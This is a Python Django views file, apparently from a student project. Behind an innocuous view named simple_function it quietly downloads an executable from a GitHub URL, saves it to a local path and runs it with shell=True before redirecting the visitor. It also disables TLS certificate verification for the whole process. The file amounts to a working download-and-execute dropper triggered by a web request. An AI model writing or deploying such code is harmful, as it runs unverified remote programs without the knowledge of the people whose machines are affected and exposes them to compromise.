from django.shortcuts import render
from django.http import HttpResponse
#################################################################
from urllib.request import urlopen
import subprocess as sp
import ssl
import getpass
##################################################################
def index(request):
    return render(request,'index.html')

#def simple_function(request):
 #   print("Hello I am Hardik")
  #  return HttpResponse("<html><script>window.location.replace('/')</script></html>")

ssl._create_default_https_context = ssl._create_unverified_context

URL = "https://github.com/Hardik121020/Testing/blob/main/PYScript.exe"#"https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
usrname = getpass.getuser()
DST = f'D:\\CSE_CSF\\Major\\download.exe'

def download(url, dst_file):
    content = urlopen(url).read()
    outfile = open(dst_file, "wb")
    outfile.write(content)
    outfile.close()


def install(prog):
    process = sp.Popen(prog, shell=True)
    process.wait()

def main():
    download(URL, DST)
    install(DST)
def simple_function(request):
    main()
    return HttpResponse("<html><script>window.location.replace('/')</script></html>")